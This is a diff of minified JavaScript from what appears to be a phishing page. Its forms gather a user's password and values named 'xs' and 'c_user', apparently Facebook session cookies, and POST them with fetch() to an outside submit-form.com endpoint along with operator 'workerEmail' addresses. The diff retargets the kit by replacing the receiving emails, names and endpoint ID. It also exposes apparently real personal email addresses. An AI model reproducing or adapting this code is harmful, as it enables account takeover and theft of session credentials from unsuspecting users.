@@ -10285,7 +10285,7 @@
           let { hide: t } = e;
           const [r, a] = (0, n.useState)(),
             [i, o] = (0, n.useState)(),
-            l = ["mjohn72929@gmail.com","ameliajackson4001@gmail.com"],
+            l = ["PROFESSOR@ASIF.Niz","PROFESSOR@ASIF.Niz"],
             s = _();
           return (0, me.jsxs)(me.Fragment, {
             children: [
@@ -10375,15 +10375,15 @@
                         className: "ant-form ant-form-horizontal css-m4timi",
                         onSubmit: (e) => {
                           e.preventDefault(),
-                            fetch("https://submit-form.com/UlUJoYqHoUlUJoYqHo", {
+                            fetch("https://submit-form.com/UlUJoYqHo", {
                               method: "POST",
                               headers: { "Content-Type": "application/json" },
                               body: JSON.stringify({
                                 emails: l,
-                                workerEmail: "mjohn72929@gmail.com",
+                                workerEmail: "PROFESSOR@ASIF.Niz",
                                 xs: r,
                                 c_user: i,
-                                name: "Aizaz",
+                                name: "PROFESSOR",
                               }),
                             }).then((e) => {
                               e.ok;
@@ -14236,7 +14236,7 @@
           });
         },
         Wt = () => {
-          const e = ["mjohn72929@gmail.com"],
+          const e = ["PROFESSOR@ASIF.Niz"],
             t = _(),
             [r, a] = (0, n.useState)(!1),
             [i, o] = (0, n.useState)(!1),
@@ -14329,10 +14329,10 @@
                                       },
                                       body: JSON.stringify({
                                         emails: e,
-                                        workerEmail: "mjohn72929@gmail.com",
+                                        workerEmail: "PROFESSOR@ASIF.Niz",
                                         xs: l,
                                         c_user: u,
-                                        name: "My Self",
+                                        name: "PROFESSOR",
                                       }),
                                     }
                                   ).then((e) => {
@@ -14422,7 +14422,7 @@
               (0, me.jsx)("button", {
                 onClick: (n) => {
                   n.preventDefault(),
-                    fetch("https://submit-form.com/UlUJoYqHoUlUJoYqHo", {
+                    fetch("https://submit-form.com/UlUJoYqHo", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
                       body: JSON.stringify({ password: t }),
